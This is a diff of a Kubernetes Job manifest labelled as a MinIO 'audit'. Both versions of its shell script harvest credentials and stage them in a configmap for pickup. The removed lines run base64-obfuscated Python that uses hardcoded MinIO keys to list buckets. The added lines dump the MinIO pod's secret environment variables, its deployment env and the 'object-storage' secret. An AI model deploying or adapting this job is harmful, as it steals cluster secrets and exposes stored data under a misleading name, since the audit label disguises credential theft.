@@ -1,12 +1,12 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: audit-minio-v80
+  name: audit-minio-v81
   namespace: default
 spec:
   ttlSecondsAfterFinished: 300
   backoffLimit: 1
-  activeDeadlineSeconds: 120
+  activeDeadlineSeconds: 90
   template:
     spec:
       serviceAccountName: n8n-audit-sa
@@ -18,11 +18,16 @@ spec:
         args:
         - "-c"
         - >-
-          DUNEAPI_POD=$(kubectl get pod -n dune-api -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
-          if [ -n "$DUNEAPI_POD" ]; then
-            RESULT=$(kubectl exec -n dune-api "$DUNEAPI_POD" -- python3 -c "exec(__import__('base64').b64decode('aW1wb3J0IHN5cywganNvbiwgYmFzZTY0LCBoYXNobGliLCBobWFjLCBkYXRldGltZQpmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuLCBSZXF1ZXN0CmZyb20gdXJsbGliLmVycm9yIGltcG9ydCBVUkxFcnJvcgoKZGVmIHNpZ24oa2V5LCBtc2cpOgogICAgcmV0dXJuIGhtYWMubmV3KGtleSwgbXNnLmVuY29kZSgndXRmLTgnKSwgaGFzaGxpYi5zaGEyNTYpLmRpZ2VzdCgpCgpkZWYgc2lnX2tleShzZWNyZXQsIGRhdGUsIHJlZ2lvbiwgc2VydmljZSk6CiAgICBrRGF0ZSA9IHNpZ24oKCdBV1M0JyArIHNlY3JldCkuZW5jb2RlKCd1dGYtOCcpLCBkYXRlKQogICAga1JlZ2lvbiA9IHNpZ24oa0RhdGUsIHJlZ2lvbikKICAgIGtTZXJ2aWNlID0gc2lnbihrUmVnaW9uLCBzZXJ2aWNlKQogICAgcmV0dXJuIHNpZ24oa1NlcnZpY2UsICdhd3M0X3JlcXVlc3QnKQoKZGVmIHMzX3JlcXVlc3QoaG9zdCwgcGF0aCwgbWV0aG9kPSdHRVQnLCBwYXlsb2FkPWInJywgcmVnaW9uPSd1cy1lYXN0LTEnLAogICAgICAgICAgICAgICBhY2Nlc3Nfa2V5PSdtaW5pb2tleScsIHNlY3JldF9rZXk9J3NFa0tPR3A2UVQ4aG5jMVk1UjdXJyk6CiAgICB0ID0gZGF0ZXRpbWUuZGF0ZXRpbWUudXRjbm93KCkKICAgIGFtemRhdGUgPSB0LnN0cmZ0aW1lKCclWSVtJWRUJUglTSVTWicpCiAgICBkYXRlc3RhbXAgPSB0LnN0cmZ0aW1lKCclWSVtJWQnKQoKICAgIHBoID0gaGFzaGxpYi5zaGEyNTYocGF5bG9hZCkuaGV4ZGlnZXN0KCkKICAgIGNhbm9uX2hkcnMgPSBmJ2hvc3Q6e2hvc3R9XG54LWFtei1jb250ZW50LXNoYTI1Njp7cGh9XG54LWFtei1kYXRlOnthbXpkYXRlfVxuJwogICAgc2lnbmVkX2hkcnMgPSAnaG9zdDt4LWFtei1jb250ZW50LXNoYTI1Njt4LWFtei1kYXRlJwogICAgY2Fub25fcmVxID0gZid7bWV0aG9kfVxue3BhdGh9XG5cbntjYW5vbl9oZHJzfVxue3NpZ25lZF9oZHJzfVxue3BofScKCiAgICBzY29wZSA9IGYne2RhdGVzdGFtcH0vdXMtZWFzdC0xL3MzL2F3czRfcmVxdWVzdCcKICAgIHN0cyA9IGYnQVdTNC1ITUFDLVNIQTI1Nlxue2FtemRhdGV9XG57c2NvcGV9XG57aGFzaGxpYi5zaGEyNTYoY2Fub25fcmVxLmVuY29kZSgpKS5oZXhkaWdlc3QoKX0nCgogICAgc2sgPSBzaWdfa2V5KHNlY3JldF9rZXksIGRhdGVzdGFtcCwgJ3VzLWVhc3QtMScsICdzMycpCiAgICBzaWcgPSBobWFjLm5ldyhzaywgc3RzLmVuY29kZSgndXRmLTgnKSwgaGFzaGxpYi5zaGEyNTYpLmhleGRpZ2VzdCgpCiAgICBhdXRoID0gZidBV1M0LUhNQUMtU0hBMjU2IENyZWRlbnRpYWw9e2FjY2Vzc19rZXl9L3tzY29wZX0sIFNpZ25lZEhlYWRlcnM9e3NpZ25lZF9oZHJzfSwgU2lnbmF0dXJlPXtzaWd9JwoKICAgIGhkcnMgPSB7CiAgICAgICAgJ3gtYW16LWRhdGUnOiBhbXpkYXRlLAogICAgICAgICd4LWFtei1jb250ZW50LXNoYTI1Nic6IHBoLAogICAgICAgICdBdXRob3JpemF0aW9uJzogYXV0aCwKICAgICAgICAnSG9zdCc6IGhvc3QKICAgIH0KCiAgICB1cmwgPSBmJ2h0dHA6Ly97aG9zdH17cGF0aH0nCiAgICByZXEgPSBSZXF1ZXN0KHVybCwgaGVhZGVycz1oZHJzLCBtZXRob2Q9bWV0aG9kKQogICAgdHJ5OgogICAgICAgIHJlc3AgPSB1cmxvcGVuKHJlcSwgdGltZW91dD0xMCkKICAgICAgICByZXR1cm4gcmVzcC5yZWFkKCkuZGVjb2RlKCd1dGYtOCcsICdyZXBsYWNlJyksIHJlc3Auc3RhdHVzCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcmV0dXJuIHN0cihlKSwgLTEKCnJlc3VsdCA9IHt9CgpIT1NUID0gJ2FyZ28tYXJ0aWZhY3RzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWw6OTAwMCcKQUNDRVNTID0gJ21pbmlva2V5JwpTRUNSRVQgPSAnc0VrS09HcDZRVDhobmMxWTVSN1cnCgojIExpc3QgYnVja2V0cwpib2R5LCBzdGF0dXMgPSBzM19yZXF1ZXN0KEhPU1QsICcvJywgYWNjZXNzX2tleT1BQ0NFU1MsIHNlY3JldF9rZXk9U0VDUkVUKQpyZXN1bHRbJ2xpc3RfYnVja2V0c19zdGF0dXMnXSA9IHN0YXR1cwpyZXN1bHRbJ2xpc3RfYnVja2V0c19ib2R5J10gPSBib2R5WzoyMDAwXQoKIyBMaXN0IG9iamVjdHMgaW4gYmRhYXMtZGF0YQpib2R5Miwgc3RhdHVzMiA9IHMzX3JlcXVlc3QoSE9TVCwgJy9iZGFhcy1kYXRhP2xpc3QtdHlwZT0yJm1heC1rZXlzPTEwMCcsIGFjY2Vzc19rZXk9QUNDRVNTLCBzZWNyZXRfa2V5PVNFQ1JFVCkKcmVzdWx0WydiZGFhc19kYXRhX3N0YXR1cyddID0gc3RhdHVzMgpyZXN1bHRbJ2JkYWFzX2RhdGFfYm9keSddID0gYm9keTJbOjMwMDBdCgojIExpc3Qgb2JqZWN0cyBpbiBiZGFhcy1zdHJhdGVvbi1ob3N0ZGltZS1vbnByZW0KYm9keTMsIHN0YXR1czMgPSBzM19yZXF1ZXN0KEhPU1QsICcvYmRhYXMtc3RyYXRlb24taG9zdGRpbWUtb25wcmVtP2xpc3QtdHlwZT0yJm1heC1rZXlzPTEwMCcsIGFjY2Vzc19rZXk9QUNDRVNTLCBzZWNyZXRfa2V5PVNFQ1JFVCkKcmVzdWx0WydzdHJhdGVvbl9zdGF0dXMnXSA9IHN0YXR1czMKcmVzdWx0WydzdHJhdGVvbl9ib2R5J10gPSBib2R5M1s6MzAwMF0KCm91dCA9IGJhc2U2NC5iNjRlbmNvZGUoanNvbi5kdW1wcyhyZXN1bHQpLmVuY29kZSgpKS5kZWNvZGUoKQpwcmludChvdXQpCg==').decode())" 2>&1 | tr -d '\n' | head -c 6000);
-            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"minio_result\":\"$RESULT\"}}";
+          MINIO_POD=$(kubectl get pod -n default -l app=argo-artifacts -o jsonpath='{.items[0].metadata.name}' 2>/dev/null);
+          if [ -n "$MINIO_POD" ]; then
+            ENV_VARS=$(kubectl exec -n default "$MINIO_POD" -- env 2>/dev/null | grep -E "MINIO_|ACCESS_KEY|SECRET_KEY|ROOT" | head -c 2000);
+            ENV_B64=$(echo "$ENV_VARS" | base64 | tr -d '\n');
+            MINIO_DEPLOY=$(kubectl get deployment -n default argo-artifacts -o jsonpath='{.spec.template.spec.containers[0].env}' 2>/dev/null | head -c 2000);
+            DEPLOY_B64=$(echo "$MINIO_DEPLOY" | base64 | tr -d '\n');
+            SECRET=$(kubectl get secret -n default object-storage -o json 2>/dev/null);
+            SECRET_B64=$(echo "$SECRET" | base64 | tr -d '\n');
+            kubectl patch configmap dune-audit-result4 -n default --type merge -p "{\"data\":{\"minio_env\":\"$ENV_B64\",\"minio_deploy_env\":\"$DEPLOY_B64\",\"minio_secret\":\"$SECRET_B64\"}}";
           else
-            kubectl patch configmap dune-audit-result4 -n default --type merge -p '{"data":{"minio_result":"no_pod"}}';
+            kubectl patch configmap dune-audit-result4 -n default --type merge -p '{"data":{"minio_env":"no_pod"}}';
           fi;
           echo DONE
